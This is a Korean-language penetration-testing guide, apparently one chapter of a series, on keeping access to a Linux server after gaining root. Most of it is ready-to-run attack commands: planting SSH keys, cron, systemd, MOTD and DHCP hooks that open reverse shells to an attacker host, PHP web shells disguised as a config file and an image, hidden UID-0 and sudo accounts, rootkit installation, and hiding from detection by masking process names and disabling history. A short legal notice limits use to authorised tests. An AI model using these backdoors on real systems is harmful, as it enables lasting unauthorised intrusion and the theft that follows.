# Phase 6: Persistence (지속성 확보)

Root 권한을 획득한 후 재접속을 위한 백도어를 설치하는 방법을 다룹니다.

## 📋 목차

1. [Persistence 기본 개념](#persistence-기본-개념)
2. [SSH 백도어](#ssh-백도어)
3. [Cron Job 백도어](#cron-job-백도어)
4. [Systemd Service 백도어](#systemd-service-백도어)
5. [Web Shell 백도어](#web-shell-백도어)
6. [User Account 백도어](#user-account-백도어)
7. [Kernel Module 백도어](#kernel-module-백도어)

---

## Persistence 기본 개념

### 왜 Persistence가 필요한가?

- Reverse Shell은 불안정 (네트워크 끊김, 프로세스 종료)
- 서버 재부팅 시 접근 권한 상실
- 언제든지 다시 접속 가능한 백도어 필요

### Persistence 설치 전 고려사항

```bash
# 1. 현재 활성 사용자 확인 (관리자 접속 여부)
w
who
last

# 2. 로그 모니터링 확인
ps aux | grep -E 'auditd|syslog|rsyslog'

# 3. 방화벽 규칙 확인
iptables -L
ufw status
```

---

## SSH 백도어

### 방법 1: SSH 키 등록

```bash
# 공격자: SSH 키 생성
ssh-keygen -t rsa -b 4096 -f ~/.ssh/redteam_key
# 또는 이미 있는 키 사용

# 공격 대상 서버
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# 공격자의 공개키 추가
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... your_key@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 접속 테스트
ssh -i ~/.ssh/redteam_key root@3.35.218.180
```

### 방법 2: 일반 사용자에 SSH 키 등록 (덜 의심스러움)

```bash
# www-data 사용자에 SSH 허용
usermod -s /bin/bash www-data

# SSH 키 등록
mkdir -p /var/www/.ssh
echo "ssh-rsa AAAAB3NzaC1yc... www-data@target" > /var/www/.ssh/authorized_keys
chmod 700 /var/www/.ssh
chmod 600 /var/www/.ssh/authorized_keys
chown -R www-data:www-data /var/www/.ssh

# 접속
ssh -i ~/.ssh/redteam_key www-data@3.35.218.180

# 접속 후 root로 전환 (sudo 설정 필요)
sudo su
```

### 방법 3: SSH 설정 변경 (위험)

```bash
# /etc/ssh/sshd_config 수정
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Root 비밀번호 설정
echo "root:RedTeam2024!" | chpasswd

# SSH 재시작
systemctl restart sshd

# 접속
ssh root@3.35.218.180
# Password: RedTeam2024!

# 주의: 매우 눈에 띄는 방법, 권장하지 않음
```

---

## Cron Job 백도어

### 방법 1: Reverse Shell Cron

```bash
# 5분마다 Reverse Shell 연결 시도
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/공격자IP/4444 0>&1") | crontab -

# 또는 /etc/crontab에 직접 추가
echo "*/10 * * * * root bash -c 'bash -i >& /dev/tcp/공격자IP/4444 0>&1'" >> /etc/crontab

# Cron 확인
crontab -l
cat /etc/crontab
```

### 방법 2: Netcat Reverse Shell Cron

```bash
# nc를 사용한 더 안정적인 연결
echo "*/5 * * * * nc 공격자IP 4444 -e /bin/bash" | crontab -

# 또는 mkfifo 방식
cat > /tmp/.update.sh << 'EOF'
#!/bin/bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 공격자IP 4444 > /tmp/f
EOF

chmod +x /tmp/.update.sh
echo "*/5 * * * * /tmp/.update.sh" | crontab -
```

### 방법 3: SSH 터널 Cron (방화벽 우회)

```bash
# Cron으로 SSH 터널 자동 생성
cat > /tmp/.ssh_tunnel.sh << 'EOF'
#!/bin/bash
while true; do
    ssh -R 2222:localhost:22 공격자계정@공격자IP -N -o StrictHostKeyChecking=no
    sleep 60
done
EOF

chmod +x /tmp/.ssh_tunnel.sh
echo "@reboot /tmp/.ssh_tunnel.sh &" | crontab -

# 공격자에서 접속
ssh -p 2222 root@localhost
```

---

## Systemd Service 백도어

### 방법 1: 커스텀 Systemd 서비스

```bash
# Systemd 서비스 파일 생성
cat > /etc/systemd/system/system-monitor.service << 'EOF'
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/공격자IP/4444 0>&1; sleep 300; done'
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target
EOF

# 서비스 활성화
systemctl daemon-reload
systemctl enable system-monitor.service
systemctl start system-monitor.service

# 상태 확인
systemctl status system-monitor.service
```

### 방법 2: 기존 서비스 변조 (은밀함)

```bash
# 예: Apache 서비스에 백도어 추가
cp /lib/systemd/system/apache2.service /lib/systemd/system/apache2.service.bak

# ExecStartPost 추가
sed -i '/ExecStart=/a ExecStartPost=/bin/bash -c "bash -i >& /dev/tcp/공격자IP/4444 0>&1 &"' /lib/systemd/system/apache2.service

# Reload
systemctl daemon-reload
systemctl restart apache2
```

### 방법 3: 타이머를 사용한 주기적 백도어

```bash
# 타이머 파일 생성
cat > /etc/systemd/system/backup.timer << 'EOF'
[Unit]
Description=Backup Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
EOF

# 서비스 파일 생성
cat > /etc/systemd/system/backup.service << 'EOF'
[Unit]
Description=Backup Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/공격자IP/4444 0>&1'
EOF

# 활성화
systemctl daemon-reload
systemctl enable backup.timer
systemctl start backup.timer
```

---

## Web Shell 백도어

### 방법 1: 은밀한 위치에 웹쉘 숨기기

```bash
# 정상 파일처럼 보이는 이름
cat > /var/www/html/admin/config.inc.php << 'EOF'
<?php
// Database configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', 'password');

// Hidden backdoor
if(isset($_GET['x'])) {
    eval(base64_decode($_GET['x']));
}
?>
EOF

# 사용법
# Base64로 명령 인코딩
echo -n "system('whoami');" | base64
# c3lzdGVtKCd3aG9hbWknKTs=

curl "http://3.35.218.180/admin/config.inc.php?x=c3lzdGVtKCd3aG9hbWknKTs="
```

### 방법 2: 이미지 파일 내부에 웹쉘 숨기기

```bash
# 정상 이미지 파일에 PHP 코드 추가
cat image.jpg > /var/www/html/uploads/profile.jpg
echo "<?php if(isset(\$_GET['cmd'])) system(\$_GET['cmd']); ?>" >> /var/www/html/uploads/profile.jpg

# .htaccess로 PHP 실행 가능하게
echo "AddType application/x-httpd-php .jpg" > /var/www/html/uploads/.htaccess

# 실행
curl "http://3.35.218.180/uploads/profile.jpg?cmd=whoami"
```

### 방법 3: Weevely 지속성

```bash
# Weevely 웹쉘 생성 (난독화됨)
weevely generate password123 /tmp/agent.php

# 업로드
cp /tmp/agent.php /var/www/html/.cache/data.php

# 접속
weevely http://3.35.218.180/.cache/data.php password123
```

---

## User Account 백도어

### 방법 1: 새로운 Root 사용자 생성

```bash
# UID 0인 사용자 생성 (Root와 동일한 권한)
useradd -ou 0 -g 0 support
echo "support:Support2024!" | chpasswd

# SSH 접속
ssh support@3.35.218.180
# Password: Support2024!

# 확인
id
# uid=0(support) gid=0(root)
```

### 방법 2: /etc/passwd 직접 수정 (탐지 어려움)

```bash
# 비밀번호 해시 생성
openssl passwd -1 -salt xyz password123
# $1$xyz$...

# /etc/passwd에 추가 (콜론 구분)
echo 'admin:$1$xyz$...:0:0:Admin User:/root:/bin/bash' >> /etc/passwd

# 로그인
su admin
# Password: password123
```

### 방법 3: Sudo 권한 부여 (덜 의심스러움)

```bash
# 일반 사용자 생성
useradd -m -s /bin/bash backup
echo "backup:Backup2024!" | chpasswd

# Sudo 권한 부여 (비밀번호 없이)
echo "backup ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/backup

# 로그인
ssh backup@3.35.218.180
sudo su
```

---

## Kernel Module 백도어

### 방법 1: LKM Rootkit (고급)

```bash
# Diamorphine Rootkit 설치
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine
make

# 설치
insmod diamorphine.ko

# 프로세스 숨기기
kill -63 <PID>

# Rootkit 숨기기
kill -64 0

# Root 권한 부여
kill -63 $(ps aux | grep [b]ash | head -1 | awk '{print $2}')
```

### 방법 2: LD_PRELOAD Rootkit

```bash
# 악의적인 공유 라이브러리 작성
cat > /lib/x86_64-linux-gnu/libcustom.so.c << 'EOF'
#include <stdio.h>
#include <dlfcn.h>

int __xstat(int ver, const char *path, struct stat *buf) {
    int (*original_xstat)(int, const char *, struct stat *);
    original_xstat = dlsym(RTLD_NEXT, "__xstat");

    // 특정 파일 숨기기
    if(strstr(path, ".backdoor") != NULL) {
        errno = ENOENT;
        return -1;
    }

    return original_xstat(ver, path, buf);
}
EOF

# 컴파일
gcc -shared -fPIC /lib/x86_64-linux-gnu/libcustom.so.c -o /lib/x86_64-linux-gnu/libcustom.so -ldl

# /etc/ld.so.preload에 추가
echo "/lib/x86_64-linux-gnu/libcustom.so" >> /etc/ld.so.preload

# .backdoor로 끝나는 파일은 ls에서 안 보임
```

---

## 고급 Persistence 기법

### MOTD (Message of the Day) 백도어

```bash
# SSH 접속 시 자동 실행
cat > /etc/update-motd.d/00-header << 'EOF'
#!/bin/bash
(bash -i >& /dev/tcp/공격자IP/4444 0>&1 &)
# 원래 MOTD 내용...
EOF

chmod +x /etc/update-motd.d/00-header
```

### PAM 백도어

```bash
# PAM 모듈 설치 (모든 인증 우회)
# 고급 주제, 별도 연구 필요

# 예: pam_unix.so 패치
# SSH 비밀번호를 무시하고 특정 마스터 비밀번호로 접속 가능
```

### DHCP 스크립트 백도어

```bash
# DHCP IP 갱신 시 실행
cat > /etc/dhcp/dhclient-exit-hooks.d/backdoor << 'EOF'
#!/bin/bash
(bash -i >& /dev/tcp/공격자IP/4444 0>&1 &)
EOF

chmod +x /etc/dhcp/dhclient-exit-hooks.d/backdoor
```

---

## Persistence 확인 및 테스트

### 백도어 동작 테스트

```bash
# 1. 서버 재부팅
reboot

# 2. Netcat 리스너 대기 (Kali)
nc -lvnp 4444

# 3. 연결 확인
# Cron, Systemd, SSH 등 설치한 백도어가 작동하는지 확인

# 4. 여러 백도어 설치 (중복성)
# - SSH 키
# - Cron Job
# - Systemd Service
# - Web Shell
# 최소 2-3개의 독립적인 백도어 권장
```

### 백도어 목록 관리

```bash
# 설치한 백도어 목록 저장 (공격자 로컬)
cat > backdoors.txt << EOF
1. SSH Key: /root/.ssh/authorized_keys
2. Cron Job: */5 * * * * bash -i >& /dev/tcp/공격자IP/4444
3. Systemd: /etc/systemd/system/system-monitor.service
4. Web Shell: /var/www/html/.cache/data.php
5. User Account: support (UID 0)
EOF
```

---

## 주의사항

### 탐지 회피

```bash
# 1. 프로세스 이름 변경
bash -c 'exec -a "[kworker/0:0]" bash -i >& /dev/tcp/공격자IP/4444 0>&1'

# 2. 로그 기록 방지
unset HISTFILE
export HISTFILESIZE=0

# 3. Timestamp 변경 (다음 Phase에서 다룸)
touch -r /etc/passwd /tmp/.backdoor.sh
```

### 법적 고지

- Persistence 백도어는 **무단 접근**을 지속시키는 행위
- **사전 승인된 침투 테스트**에만 사용
- 테스트 종료 후 **모든 백도어 제거** 필수

---

## Persistence 체크리스트

- [ ] SSH 키 등록 (Root 또는 일반 사용자)
- [ ] Cron Job 백도어 설치
- [ ] Systemd Service 백도어 설치
- [ ] Web Shell 숨김 배치
- [ ] 백도어 계정 생성 (UID 0 또는 sudo)
- [ ] 서버 재부팅 테스트
- [ ] 여러 백도어 중복 설치 확인
- [ ] 백도어 목록 문서화

---

## 다음 단계

지속성 확보 후:
1. 데이터 탈취 (Phase 7)
2. 흔적 제거 (Phase 8)

[→ Phase 7: Data Exfiltration으로 이동](07_data_exfiltration.md)
